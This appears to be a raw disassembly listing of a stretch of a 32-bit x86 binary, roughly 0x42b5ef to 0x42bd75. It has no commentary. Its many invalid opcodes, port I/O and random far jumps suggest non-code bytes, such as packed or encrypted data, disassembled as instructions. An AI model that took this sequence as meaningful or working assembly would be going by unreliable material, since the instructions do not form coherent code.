  42b5ef:	mov    bh,0x55
  42b5f1:	push   cs
  42b5f2:	iret   
  42b5f3:	out    0x85,al
  42b5f5:	pop    esp
  42b5f6:	(bad)  
  42b5f7:	xor    ebx,edx
  42b5f9:	cdq    
  42b5fa:	loope  0x42b610
  42b5fc:	sub    ecx,DWORD PTR [edi+edx*4-0x4b3038ea]
  42b603:	in     al,0x45
  42b605:	cmp    al,0x6b
  42b607:	jmp    0xd0e2:0xa18446ed
  42b60e:	mov    ebx,0xb4ddf835
  42b613:	adc    al,0x17
  42b615:	xor    bl,BYTE PTR [ebp+0x670f85aa]
  42b61b:	out    dx,al
  42b61c:	retf   
  42b61d:	mov    eax,ds:0x91a6097
  42b622:	retf   
  42b623:	mov    DWORD PTR [edx+eax*4],eax
  42b626:	pop    esi
  42b627:	sti    
  42b628:	add    DWORD PTR [ecx-0x1dec7b5],esp
  42b62e:	cmp    BYTE PTR [esi-0x189540ce],0x4a
  42b635:	cdq    
  42b636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b637:	adc    eax,0xe7004439
  42b63c:	xlat   BYTE PTR ds:[ebx]
  42b63d:	mov    al,ds:0x8125d0cb
  42b642:	adc    al,BYTE PTR [edi+ebp*8-0x6194f9ee]
  42b649:	add    DWORD PTR [esi-0x40e849aa],0x4b99d014
  42b653:	ins    DWORD PTR es:[edi],dx
  42b654:	rep stos DWORD PTR es:[edi],eax
  42b656:	jns    0x42b632
  42b658:	inc    edi
  42b659:	repnz xor BYTE PTR [edi],ah
  42b65c:	icebp  
  42b65d:	dec    eax
  42b65e:	rol    DWORD PTR [esp+edi*4],0xc8
  42b662:	out    dx,al
  42b663:	sub    ebx,DWORD PTR [esi+0x48]
  42b666:	mov    edx,0x464ce673
  42b66b:	add    ebx,DWORD PTR [ebp-0x4a849760]
  42b671:	push   0x9a0e24c0
  42b676:	mov    esi,0xf3650e44
  42b67b:	sub    esp,DWORD PTR [esi]
  42b67d:	add    ch,cl
  42b67f:	popf   
  42b680:	aas    
  42b681:	leave  
  42b682:	pop    eax
  42b683:	or     BYTE PTR [ecx],bl
  42b685:	xlat   BYTE PTR ds:[ebx]
  42b686:	xchg   ecx,eax
  42b687:	adc    BYTE PTR [esi],bl
  42b689:	sub    DWORD PTR [edx+0x42],ecx
  42b68c:	mov    ebx,0xed301c24
  42b691:	mov    al,ds:0xf0c5ac46
  42b696:	pushf  
  42b697:	repnz test eax,0x1d1b239b
  42b69d:	sub    DWORD PTR [ebx-0x673339db],ebx
  42b6a3:	xor    BYTE PTR [eax-0x63],bh
  42b6a6:	retf   
  42b6a7:	xchg   edx,eax
  42b6a8:	sbb    eax,0x22208ca8
  42b6ad:	out    0xc6,eax
  42b6af:	dec    ecx
  42b6b0:	dec    ebp
  42b6b1:	cmp    eax,0xe36b94b3
  42b6b6:	aam    0xd5
  42b6b8:	popf   
  42b6b9:	mov    ds:0x5fae90cb,eax
  42b6be:	add    DWORD PTR [edx+0x3f],ebp
  42b6c1:	jecxz  0x42b71b
  42b6c3:	inc    ecx
  42b6c4:	adc    ch,ch
  42b6c6:	ret    0x45bb
  42b6c9:	(bad)  
  42b6ca:	cwde   
  42b6cb:	repnz scas eax,DWORD PTR es:[edi]
  42b6cd:	mov    dl,0x41
  42b6cf:	xor    al,0xe5
  42b6d1:	nop
  42b6d2:	cmp    eax,0xde1ea6ea
  42b6d7:	scas   eax,DWORD PTR es:[edi]
  42b6d8:	and    BYTE PTR [ecx+0xa625126],ch
  42b6de:	jo     0x42b758
  42b6e0:	xchg   ebp,eax
  42b6e1:	fwait
  42b6e2:	sub    ebx,DWORD PTR ds:0x39833e9c
  42b6e8:	mov    ebx,0xaa35323
  42b6ed:	dec    edx
  42b6ee:	mov    bl,0x92
  42b6f0:	sti    
  42b6f1:	jl     0x42b6ef
  42b6f3:	arpl   bp,ax
  42b6f5:	jb     0x42b6ed
  42b6f7:	call   0xf588230a
  42b6fc:	les    eax,FWORD PTR [edi]
  42b6fe:	mov    eax,0xbf0f211a
  42b703:	in     al,0xc0
  42b705:	popa   
  42b706:	jge    0x42b68b
  42b708:	sbb    DWORD PTR [ebp-0x7c778e95],0x576a362d
  42b712:	arpl   WORD PTR [ebx],sp
  42b714:	mov    esp,0xb3e4d285
  42b719:	mov    al,ds:0x9094ebf9
  42b71e:	or     eax,0x3ba4c42a
  42b723:	rol    DWORD PTR [ebp+0x2d577e8b],cl
  42b729:	leave  
  42b72a:	jl     0x42b721
  42b72c:	jo     0x42b76d
  42b72e:	jae    0x42b744
  42b730:	pop    ss
  42b731:	jnp    0x42b6b3
  42b733:	or     dh,ch
  42b735:	je     0x42b715
  42b737:	in     al,0x20
  42b739:	ins    DWORD PTR es:[edi],dx
  42b73a:	push   ebx
  42b73b:	jae    0x42b754
  42b73d:	sub    DWORD PTR [edx-0x1a],esi
  42b740:	push   ebp
  42b741:	sub    al,0x24
  42b743:	jne    0x42b7b9
  42b745:	mov    ds:0x35916c7b,eax
  42b74a:	mov    ax,0x6910
  42b74e:	dec    ebx
  42b74f:	test   eax,0x34b5a2ad
  42b754:	in     al,dx
  42b755:	pop    edi
  42b756:	int3   
  42b757:	and    DWORD PTR [edx+0x4896c69c],ebp
  42b75d:	dec    ecx
  42b75e:	push   cs
  42b75f:	xlat   BYTE PTR ds:[ebx]
  42b760:	push   esp
  42b761:	cmp    eax,0x2945ffd8
  42b766:	and    eax,0xeeda70e5
  42b76b:	jbe    0x42b702
  42b76d:	sub    bh,BYTE PTR [edi+0x4f]
  42b770:	xchg   ebx,eax
  42b771:	fxch   st(5)
  42b773:	push   cs
  42b774:	sbb    DWORD PTR [eax+ebx*1-0x29],esi
  42b778:	xchg   edi,eax
  42b779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b77a:	sub    ebx,DWORD PTR [esi]
  42b77c:	rcr    ch,cl
  42b77e:	mov    cl,BYTE PTR [ebp+0x44]
  42b781:	dec    ebp
  42b782:	cs mov dh,0x65
  42b785:	sti    
  42b786:	mov    ah,0xa4
  42b788:	and    al,0xea
  42b78a:	aam    0x49
  42b78c:	push   ebp
  42b78d:	xor    eax,0x467ceb44
  42b792:	test   BYTE PTR [ecx+0x3b3e291e],0x73
  42b799:	test   al,0xa6
  42b79b:	ficomp WORD PTR [edx-0x7789b45e]
  42b7a1:	cmp    eax,0xb327da0c
  42b7a6:	je     0x42b7ac
  42b7a8:	hlt    
  42b7a9:	jo     0x42b765
  42b7ab:	inc    esp
  42b7ac:	add    BYTE PTR [eax],cl
  42b7ae:	inc    ecx
  42b7af:	call   0xae4e:0xd89b99dd
  42b7b6:	ror    BYTE PTR [esi+edx*4-0x14],0x61
  42b7bb:	mov    ds:0x3395c94d,al
  42b7c0:	inc    ecx
  42b7c1:	jne    0x42b7f3
  42b7c3:	mov    ds:0xe848feb4,al
  42b7c8:	and    eax,0x89eec05a
  42b7cd:	pop    ss
  42b7ce:	test   eax,0x7a391ebd
  42b7d3:	mov    al,0x76
  42b7d5:	std    
  42b7d6:	gs inc edx
  42b7d8:	sbb    bl,BYTE PTR [esi+0x6330c4fb]
  42b7de:	popf   
  42b7df:	daa    
  42b7e0:	dec    esi
  42b7e1:	mov    eax,0x2b8c03aa
  42b7e6:	out    0xc4,al
  42b7e8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  42b7ea:	sbb    esp,esp
  42b7ec:	pop    edi
  42b7ed:	sar    bl,1
  42b7ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b7f0:	xor    DWORD PTR [ebx-0x2b],ebp
  42b7f3:	mov    al,ds:0x82b653a2
  42b7f8:	(bad)  
  42b7f9:	pop    ecx
  42b7fa:	popa   
  42b7fb:	dec    ecx
  42b7fc:	jbe    0x42b7a7
  42b7fe:	jmp    0x42b80d
  42b800:	inc    ebp
  42b801:	(bad)  
  42b802:	jmp    0xcf3:0xe8bcf52f
  42b809:	xchg   edi,eax
  42b80a:	bound  ecx,QWORD PTR [esi-0x517df585]
  42b810:	test   BYTE PTR [edx+0x1e627075],0xbb
  42b817:	cwde   
  42b818:	(bad)  
  42b819:	mov    ds:0xa0cc6eab,al
  42b81e:	retf   0x4cfe
  42b821:	inc    edi
  42b822:	test   DWORD PTR [ebp-0x1b427fea],esi
  42b828:	or     eax,0x55e88153
  42b82d:	mov    cl,BYTE PTR [edi]
  42b82f:	hlt    
  42b830:	stos   BYTE PTR es:[edi],al
  42b831:	(bad)  
  42b832:	push   ds
  42b833:	jae    0x42b855
  42b835:	stc    
  42b836:	inc    edx
  42b837:	xor    ecx,edi
  42b839:	enter  0x3a83,0x5a
  42b83d:	mov    eax,ds:0xe7d025ab
  42b842:	sbb    edi,edx
  42b844:	jge    0x42b891
  42b846:	out    0xa8,al
  42b848:	mov    ch,BYTE PTR [esi]
  42b84a:	dec    esi
  42b84b:	xor    eax,0x5e1ef7d6
  42b850:	mov    ah,0xff
  42b852:	mov    edx,0xdfe32633
  42b857:	lds    esp,FWORD PTR [edx]
  42b859:	push   edi
  42b85a:	push   ecx
  42b85b:	fs scas al,BYTE PTR es:[edi]
  42b85d:	cld    
  42b85e:	out    dx,al
  42b85f:	sbb    dl,BYTE PTR [ecx]
  42b861:	xchg   edx,eax
  42b862:	es cmc 
  42b864:	push   ecx
  42b865:	aaa    
  42b866:	popf   
  42b867:	shl    al,0xc2
  42b86a:	and    eax,0x2c46a572
  42b86f:	repz cmp al,0x3c
  42b872:	inc    edx
  42b873:	jo     0x42b8cf
  42b875:	stos   DWORD PTR es:[edi],eax
  42b876:	push   eax
  42b877:	add    al,0x20
  42b879:	imul   edi,DWORD PTR [ebp-0x4f],0xdf07978a
  42b880:	push   esi
  42b881:	jo     0x42b883
  42b883:	jecxz  0x42b8ae
  42b885:	mov    ebp,0xa0f962e1
  42b88a:	pop    eax
  42b88b:	mov    ebx,0x170891b
  42b890:	adc    BYTE PTR [eax+0xc],dh
  42b893:	nop
  42b894:	push   esi
  42b895:	mov    al,ds:0x7f19830b
  42b89a:	push   es
  42b89b:	cmp    al,0x45
  42b89d:	jmp    0x42b8c9
  42b89f:	dec    eax
  42b8a0:	clc    
  42b8a1:	fnstenv [ecx+0x496c51c4]
  42b8a7:	iret   
  42b8a8:	aad    0x5b
  42b8aa:	mov    al,ds:0x5c01bef2
  42b8af:	(bad)  
  42b8b0:	and    DWORD PTR [ecx+0x15a4099c],ebp
  42b8b6:	and    edx,DWORD PTR [esi]
  42b8b8:	add    DWORD PTR [ebx+ecx*8+0x8765882],esp
  42b8bf:	and    bl,BYTE PTR [esi]
  42b8c1:	dec    eax
  42b8c2:	out    0x53,eax
  42b8c4:	repz leave 
  42b8c6:	jae    0x42b940
  42b8c8:	xlat   BYTE PTR ds:[ebx]
  42b8c9:	adc    DWORD PTR [edx-0x2a],ebp
  42b8cc:	xchg   edx,eax
  42b8cd:	loope  0x42b90f
  42b8cf:	ins    BYTE PTR es:[edi],dx
  42b8d0:	inc    ebp
  42b8d1:	xchg   ecx,eax
  42b8d2:	shr    esp,0x8e
  42b8d5:	adc    edx,DWORD PTR [edx-0x53ff4a69]
  42b8db:	sbb    DWORD PTR [esi+ebx*1],eax
  42b8de:	mov    ch,0x74
  42b8e0:	imul   ebp,DWORD PTR [ebx-0x5e],0x80d4a534
  42b8e7:	in     al,dx
  42b8e8:	jg     0x42b8d4
  42b8ea:	lds    esi,FWORD PTR ds:0x5a129923
  42b8f0:	or     DWORD PTR [ebx-0x64],edi
  42b8f3:	sub    BYTE PTR [edx-0x4a6f4540],0x87
  42b8fa:	(bad)  
  42b8fb:	not    edx
  42b8fd:	loope  0x42b920
  42b8ff:	rol    ah,1
  42b901:	or     ebp,0xb120a065
  42b907:	aam    0xe5
  42b909:	shl    cl,0xb5
  42b90c:	vpcmpeqd ymm7,ymm0,ymm5
  42b910:	dec    edi
  42b911:	leave  
  42b912:	sbb    DWORD PTR [ebx],ebx
  42b914:	add    al,0x94
  42b916:	ins    BYTE PTR es:[edi],dx
  42b917:	in     eax,dx
  42b918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b919:	test   al,0xbb
  42b91b:	cwde   
  42b91c:	adc    ecx,DWORD PTR [eax-0xb]
  42b91f:	push   ebx
  42b920:	jns    0x42b90b
  42b922:	mov    ebp,0xb883b783
  42b927:	in     al,0x27
  42b929:	cmp    eax,0x33f500c7
  42b92e:	lock in al,dx
  42b930:	cmp    al,0x85
  42b932:	cmp    BYTE PTR [edi],0xed
  42b935:	cmp    dl,ch
  42b937:	popa   
  42b938:	sbb    esp,ecx
  42b93a:	(bad)  
  42b93c:	mov    bl,0x12
  42b93e:	or     ecx,ebx
  42b940:	add    eax,0xd7ed7988
  42b945:	into   
  42b946:	mov    WORD PTR [eax+ebx*1],?
  42b949:	fst    DWORD PTR [esi+ebx*4+0x32301f44]
  42b950:	imul   esp,DWORD PTR [edx+0x10bbf77b],0xffffffad
  42b957:	xor    dh,bh
  42b959:	jne    0x42b990
  42b95b:	or     eax,0xf4b0ab32
  42b960:	mov    ch,0x15
  42b962:	inc    ecx
  42b963:	mov    bl,0x86
  42b965:	lds    edx,FWORD PTR [ecx]
  42b967:	push   ebp
  42b968:	inc    esi
  42b969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b96a:	push   ecx
  42b96b:	add    eax,0xcb3e4708
  42b970:	mov    ebp,0x31c4b070
  42b975:	mov    ecx,0xae65c8a3
  42b97a:	(bad)  
  42b97c:	retf   0x69dd
  42b97f:	stos   BYTE PTR es:[edi],al
  42b980:	sbb    BYTE PTR [ecx-0x7d84a08a],cl
  42b986:	pop    DWORD PTR [esi+0x2cf96e8]
  42b98c:	push   ds
  42b98d:	mov    edx,esp
  42b98f:	cld    
  42b990:	push   edx
  42b991:	xchg   ebx,eax
  42b992:	imul   ebx,DWORD PTR [edi],0x42d15a13
  42b998:	pusha  
  42b999:	mov    bh,dh
  42b99b:	pop    esp
  42b99c:	mov    bl,0x1c
  42b99e:	mov    esi,0xba41fbc
  42b9a3:	fdivr  DWORD PTR [edi+esi*1+0x7c8a4e04]
  42b9aa:	int3   
  42b9ab:	and    eax,0xe567a508
  42b9b0:	jbe    0x42b95f
  42b9b2:	arpl   WORD PTR [bp+di-0x4d71],bp
  42b9b7:	push   ecx
  42b9b8:	jne    0x42b93e
  42b9ba:	stos   DWORD PTR es:[edi],eax
  42b9bb:	jmp    0x5916:0xfb3ee24d
  42b9c2:	enter  0xcd45,0x53
  42b9c6:	iret   
  42b9c7:	sub    ebp,DWORD PTR [eax-0x65]
  42b9ca:	sbb    esp,ecx
  42b9cc:	xchg   edx,eax
  42b9cd:	push   0x66
  42b9cf:	pop    ecx
  42b9d0:	sti    
  42b9d1:	and    ebx,DWORD PTR [ecx+ebx*1-0x6f]
  42b9d5:	addr16 mov ecx,0x75be1944
  42b9db:	mov    al,0x89
  42b9dd:	outs   dx,DWORD PTR ds:[esi]
  42b9de:	lock aad 0x80
  42b9e1:	push   0xf51ad4d6
  42b9e6:	mul    BYTE PTR [edx-0x5103a67f]
  42b9ec:	cmp    DWORD PTR [eax-0x39],edx
  42b9ef:	xchg   esp,eax
  42b9f0:	adc    eax,0x9debbeae
  42b9f5:	mov    BYTE PTR [ebx*4+0x1b36a91f],0x7e
  42b9fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9fe:	adc    DWORD PTR [ebp-0x4],eax
  42ba01:	fwait
  42ba02:	mov    ebx,0xd2bc85b7
  42ba07:	inc    esi
  42ba08:	cmc    
  42ba09:	fiadd  DWORD PTR [ecx]
  42ba0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba0c:	sbb    bh,al
  42ba0e:	mov    ecx,0xe960eb74
  42ba13:	cmp    dh,dh
  42ba15:	xor    BYTE PTR [edx-0x31],ah
  42ba18:	sbb    BYTE PTR [ebx+0x78],bl
  42ba1b:	jg     0x42b9ef
  42ba1d:	out    0xc1,al
  42ba1f:	mov    ebp,0x54b906fb
  42ba24:	fwait
  42ba25:	inc    ebp
  42ba26:	mov    ds:0x7ba2a44c,al
  42ba2b:	mov    al,0x21
  42ba2d:	cwde   
  42ba2e:	mov    dh,0xbb
  42ba30:	xchg   ecx,eax
  42ba31:	loop   0x42b9d8
  42ba33:	mov    ds:0x952da4a4,al
  42ba38:	push   ds
  42ba39:	sbb    edx,DWORD PTR [eax+0x53]
  42ba3c:	setb   ch
  42ba3f:	mov    ebx,0x9ff7d8fe
  42ba44:	out    0xdc,eax
  42ba46:	inc    ebp
  42ba47:	push   0xffffffab
  42ba49:	test   eax,0x505f6d3c
  42ba4e:	mov    dl,0x74
  42ba50:	popa   
  42ba51:	ins    DWORD PTR es:[edi],dx
  42ba52:	sub    ebp,esp
  42ba54:	xor    eax,0xf6e5d643
  42ba59:	xchg   edi,eax
  42ba5a:	sar    BYTE PTR [edx],0x8f
  42ba5d:	sbb    edi,edx
  42ba5f:	(bad)  
  42ba60:	and    DWORD PTR [esi+0x49],edx
  42ba63:	push   cs
  42ba64:	sbb    esp,0xffffffbf
  42ba67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba68:	push   edi
  42ba69:	sahf   
  42ba6a:	popa   
  42ba6b:	xlat   BYTE PTR ds:[ebx]
  42ba6c:	in     eax,dx
  42ba6d:	or     al,0xe3
  42ba6f:	jmp    0xb5c2:0xa09119e4
  42ba76:	mov    ds:0x172fbbc5,al
  42ba7b:	jmp    0x853cb627
  42ba80:	test   ebp,ebx
  42ba82:	dec    edx
  42ba83:	in     eax,0x8e
  42ba85:	hlt    
  42ba86:	push   0x45
  42ba88:	and    cl,ch
  42ba8a:	sub    ebx,DWORD PTR [edx-0x27e40234]
  42ba90:	adc    eax,0x4e2ba6
  42ba95:	cmp    eax,0xd7e8522a
  42ba9a:	leave  
  42ba9b:	mov    ebp,0x34b4a61e
  42baa0:	leave  
  42baa1:	imul   edx,DWORD PTR [edx+0x7b9ead4f],0xffffffca
  42baa8:	mov    edx,?
  42baaa:	std    
  42baab:	fsubr  st(2),st
  42baad:	sbb    BYTE PTR [esi-0x73],bl
  42bab0:	jle    0x42bad8
  42bab2:	lods   al,BYTE PTR ds:[esi]
  42bab3:	push   esi
  42bab4:	mov    ch,0x78
  42bab6:	mov    esp,0x2bd878c8
  42babb:	mov    ch,0xa2
  42babd:	jnp    0x42bb18
  42babf:	adc    BYTE PTR [edi+esi*8],bl
  42bac2:	xchg   DWORD PTR [esi+0x22],ecx
  42bac5:	add    esi,DWORD PTR [ebp-0x7ae6df4a]
  42bacb:	add    esi,DWORD PTR [edx]
  42bacd:	pop    ss
  42bace:	enter  0x1790,0x75
  42bad2:	outs   dx,DWORD PTR ds:[esi]
  42bad3:	lds    eax,FWORD PTR [ecx]
  42bad5:	lahf   
  42bad6:	or     al,BYTE PTR [ebp+0x13]
  42bad9:	push   0xffffffd1
  42badb:	(bad)  
  42badc:	xchg   BYTE PTR [ecx+0x2c1e4817],ah
  42bae2:	dec    edx
  42bae3:	retf   
  42bae4:	hlt    
  42bae5:	or     al,0x3c
  42bae7:	or     ebp,DWORD PTR [ecx+0x4a]
  42baea:	or     dl,BYTE PTR [ecx]
  42baec:	jno    0x42bb3e
  42baee:	into   
  42baef:	call   0xe3279417
  42baf4:	out    0x68,eax
  42baf6:	leave  
  42baf7:	mov    ah,0x56
  42baf9:	mov    ds:0xead5441b,eax
  42bafe:	adc    ebp,DWORD PTR [ebp-0xe2478a4]
  42bb04:	stc    
  42bb05:	pop    esp
  42bb06:	mov    esi,0x77ea01d4
  42bb0b:	pop    ds
  42bb0c:	in     eax,0x22
  42bb0e:	ret    
  42bb0f:	jmp    0xf906faf2
  42bb14:	sbb    al,0x89
  42bb16:	mov    eax,ecx
  42bb18:	push   es
  42bb19:	pop    esp
  42bb1a:	hlt    
  42bb1b:	mov    edx,0x7c8c0b0c
  42bb20:	arpl   WORD PTR [esi],ax
  42bb22:	pop    DWORD PTR [edx]
  42bb24:	xchg   ebx,eax
  42bb25:	into   
  42bb26:	mov    ds:0x6cd12c01,al
  42bb2b:	hlt    
  42bb2c:	dec    ebx
  42bb2d:	push   ebx
  42bb2e:	mov    esi,0x66371f84
  42bb33:	(bad)  
  42bb34:	test   esp,ebx
  42bb36:	xchg   ebx,eax
  42bb37:	jmp    0x42bb34
  42bb39:	pop    es
  42bb3a:	push   edi
  42bb3b:	loopne 0x42bb5f
  42bb3d:	sub    DWORD PTR [esi],ecx
  42bb3f:	mov    esi,0xed5408b7
  42bb44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb45:	lds    ebp,FWORD PTR [ecx+0x4e]
  42bb48:	test   DWORD PTR [ebx],ebx
  42bb4a:	loopne 0x42bb36
  42bb4c:	xor    esi,DWORD PTR [esi+0x30]
  42bb4f:	sub    edi,edi
  42bb51:	jl     0x42bb08
  42bb53:	or     al,0xbd
  42bb55:	jge    0x42bb89
  42bb57:	out    0x6b,eax
  42bb59:	mov    ch,0x19
  42bb5b:	cld    
  42bb5c:	cmp    eax,0xd07adba4
  42bb61:	js     0x42bbb4
  42bb63:	sbb    eax,0x67a1087d
  42bb68:	inc    edx
  42bb69:	cwde   
  42bb6a:	mov    ecx,0x97350104
  42bb6f:	call   0xe6904d39
  42bb74:	frstor [ecx+0x3d9a27f6]
  42bb7a:	adc    al,0xd0
  42bb7c:	in     eax,0xc8
  42bb7e:	add    eax,0xda812fef
  42bb83:	(bad)  
  42bb84:	inc    esi
  42bb85:	ins    DWORD PTR es:[edi],dx
  42bb86:	pusha  
  42bb87:	pop    ebx
  42bb88:	push   0xffffff9c
  42bb8a:	xchg   esi,eax
  42bb8b:	popf   
  42bb8c:	inc    ecx
  42bb8d:	adc    eax,0x1ca8b3eb
  42bb92:	mov    edi,0x3bc70db4
  42bb97:	fcmovnbe st,st(6)
  42bb99:	addr16 jbe 0x42bc19
  42bb9c:	scas   al,BYTE PTR es:[edi]
  42bb9d:	leave  
  42bb9e:	add    al,0xf
  42bba0:	mov    ds:0x1b84bfd8,eax
  42bba5:	test   eax,0x3255d213
  42bbaa:	int3   
  42bbab:	mov    eax,ds:0xf52ba419
  42bbb0:	inc    eax
  42bbb1:	sbb    esp,DWORD PTR [ebx]
  42bbb3:	(bad)
  42bbb7:	pop    edx
  42bbb8:	leave  
  42bbb9:	jae    0x42bb73
  42bbbb:	test   bh,ch
  42bbbd:	cmp    BYTE PTR cs:[esi-0x1c],dl
  42bbc1:	fwait
  42bbc2:	jnp    0x42bc34
  42bbc4:	sub    BYTE PTR [edx+0x533f4fa2],bl
  42bbca:	xor    DWORD PTR [ecx-0x56],esi
  42bbcd:	pushf  
  42bbce:	jo     0x42bbc7
  42bbd0:	fist   DWORD PTR [edx]
  42bbd2:	mov    dl,0xe4
  42bbd4:	into   
  42bbd5:	pushf  
  42bbd6:	sbb    edx,DWORD PTR [ebx]
  42bbd8:	cli    
  42bbd9:	lea    ecx,[edx]
  42bbdb:	lods   eax,DWORD PTR ds:[esi]
  42bbdc:	stc    
  42bbdd:	sub    DWORD PTR [edx+ebx*8+0x79c1e63],eax
  42bbe4:	mov    edi,0x7084bcae
  42bbe9:	sahf   
  42bbea:	mov    ebx,0x7f4af7d5
  42bbef:	arpl   WORD PTR cs:[ebp-0x27],di
  42bbf3:	inc    ebx
  42bbf4:	je     0x42bb95
  42bbf6:	mov    edi,DWORD PTR [eax+0x5f]
  42bbf9:	mov    ch,0x90
  42bbfb:	add    edx,edi
  42bbfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbfe:	or     ebx,DWORD PTR [ecx]
  42bc00:	loopne 0x42bc2d
  42bc02:	mov    BYTE PTR [eax-0x78b6a0e],bh
  42bc08:	lods   al,BYTE PTR ds:[esi]
  42bc09:	enter  0x1688,0x79
  42bc0d:	stos   BYTE PTR es:[edi],al
  42bc0e:	in     al,0x54
  42bc10:	pop    ebp
  42bc11:	call   0x72888f58
  42bc16:	fdivrp st(2),st
  42bc18:	ins    BYTE PTR es:[edi],dx
  42bc19:	aam    0x82
  42bc1b:	pop    ds
  42bc1c:	int    0x5c
  42bc1e:	sahf   
  42bc1f:	xor    dh,BYTE PTR [ecx]
  42bc21:	add    edi,ebp
  42bc23:	(bad)  
  42bc25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc26:	dec    esp
  42bc27:	outs   dx,BYTE PTR ds:[esi]
  42bc28:	add    eax,0x19bbf08a
  42bc2d:	and    eax,0x99d4dafc
  42bc32:	test   dh,bh
  42bc34:	jle    0x42bca0
  42bc36:	mov    cl,0x94
  42bc38:	call   0x860e2933
  42bc3d:	jo     0x42bc1f
  42bc3f:	in     al,0xed
  42bc41:	repnz xor ch,BYTE PTR [eax+0x18]
  42bc45:	imul   edx,edi,0xb74aea21
  42bc4b:	fld    DWORD PTR [ebx-0x7e03460]
  42bc51:	xchg   DWORD PTR [ebx-0x67],esp
  42bc54:	scas   eax,DWORD PTR es:[edi]
  42bc55:	cmp    al,0xe2
  42bc57:	adc    eax,0x752eaf08
  42bc5c:	and    al,0x4e
  42bc5e:	add    bl,ah
  42bc60:	push   edi
  42bc61:	mov    eax,ds:0xed976afb
  42bc66:	jge    0x42bcc7
  42bc68:	fnstenv [edi+eax*2-0x5462bff7]
  42bc6f:	push   0x24ac45f1
  42bc74:	fs call 0xfe40:0x841a469b
  42bc7c:	sbb    edx,0x2e93ee13
  42bc82:	iret   
  42bc83:	jb     0x42bca1
  42bc85:	into   
  42bc86:	mov    esi,0xea24f244
  42bc8b:	jne    0x42bd09
  42bc8d:	xor    DWORD PTR [eax+esi*8],ebp
  42bc90:	mov    esp,0x8c8d6733
  42bc95:	outs   dx,BYTE PTR ds:[esi]
  42bc96:	mov    al,0x4
  42bc98:	sbb    DWORD PTR [ecx-0x7ef7c864],ebp
  42bc9e:	retf   
  42bc9f:	push   0x4d
  42bca1:	push   ss
  42bca2:	lods   al,BYTE PTR ds:[esi]
  42bca3:	pop    es
  42bca4:	jb     0x42bcca
  42bca6:	sbb    eax,0xf19ade8d
  42bcab:	cmc    
  42bcac:	mov    ah,0xab
  42bcae:	test   al,0x31
  42bcb0:	pop    edi
  42bcb1:	sahf   
  42bcb2:	mov    dl,0xd4
  42bcb4:	loopne 0x42bc47
  42bcb6:	dec    ecx
  42bcb7:	mov    cl,0x45
  42bcb9:	mov    BYTE PTR [eax+ebp*8],cl
  42bcbc:	jl     0x42bcd3
  42bcbe:	gs mov edi,0xfdde91d
  42bcc4:	mov    ah,0x51
  42bcc6:	pop    esi
  42bcc7:	outs   dx,DWORD PTR ds:[esi]
  42bcc8:	sbb    esi,edx
  42bcca:	retf   
  42bccb:	adc    al,0xd0
  42bccd:	sub    DWORD PTR [eax],edi
  42bccf:	jmp    0x42bce7
  42bcd1:	jb     0x42bd17
  42bcd3:	jmp    0x7964762b
  42bcd8:	(bad)  
  42bcd9:	dec    esi
  42bcda:	xchg   edx,eax
  42bcdb:	adc    DWORD PTR [edi-0x6a146b7d],edi
  42bce1:	jge    0x42bcc4
  42bce3:	in     eax,0x22
  42bce5:	outs   dx,BYTE PTR ds:[esi]
  42bce6:	xchg   esp,eax
  42bce7:	ret    0x1ba4
  42bcea:	pop    edi
  42bceb:	and    al,0x23
  42bced:	sbb    DWORD PTR [ebx],ecx
  42bcef:	jle    0x42bc88
  42bcf1:	addr16 jno 0x42bca9
  42bcf4:	ret    
  42bcf5:	mov    al,ds:0x91fe212b
  42bcfa:	inc    ebp
  42bcfb:	push   es
  42bcfc:	icebp  
  42bcfd:	lods   eax,DWORD PTR ds:[esi]
  42bcfe:	test   ah,bl
  42bd00:	out    dx,al
  42bd01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd02:	mov    edx,0xa1de3234
  42bd07:	mov    ebp,fs
  42bd09:	pop    es
  42bd0a:	into   
  42bd0b:	jmp    0x4934:0x7460d5ac
  42bd12:	xchg   edi,eax
  42bd13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd14:	inc    ebx
  42bd15:	push   es
  42bd16:	cmova  ebx,DWORD PTR ds:0x76eec915
  42bd1d:	push   ebp
  42bd1e:	(bad)  
  42bd1f:	sub    al,0x9e
  42bd21:	lahf   
  42bd22:	repz mov gs,WORD PTR [ecx-0x35]
  42bd26:	cld    
  42bd27:	(bad)  
  42bd28:	and    DWORD PTR [ecx-0x7d381b6c],ebx
  42bd2e:	cmp    BYTE PTR [ecx-0x4a],0xa6
  42bd32:	mov    ebp,ebx
  42bd34:	fwait
  42bd35:	inc    esi
  42bd36:	and    al,0xaa
  42bd38:	sbb    eax,0x2c658c96
  42bd3d:	xchg   DWORD PTR [edx-0x61dedf1a],ebx
  42bd43:	dec    esi
  42bd44:	repz pop edx
  42bd46:	int    0x8
  42bd48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd49:	dec    ebp
  42bd4a:	and    ebx,esi
  42bd4c:	mov    DWORD PTR [esp+eiz*4-0x7d],ecx
  42bd50:	das    
  42bd51:	jmp    0xf6069c17
  42bd56:	sbb    al,0xab
  42bd58:	cdq    
  42bd59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd5a:	mov    ch,BYTE PTR [edx-0x15bcd86b]
  42bd60:	cmovl  ebx,DWORD PTR [edx+0x70]
  42bd64:	dec    ebp
  42bd65:	dec    ecx
  42bd66:	sub    eax,0xd0089beb
  42bd6b:	imul   edx,DWORD PTR [eax+0x62],0xfffffff0
  42bd6f:	fs jne 0x42bd1a
  42bd72:	cmp    edx,ebx
  42bd74:	pop    eax
  42bd75:	mov    dh,BYTE PTR [eax+edi*1+0x68]
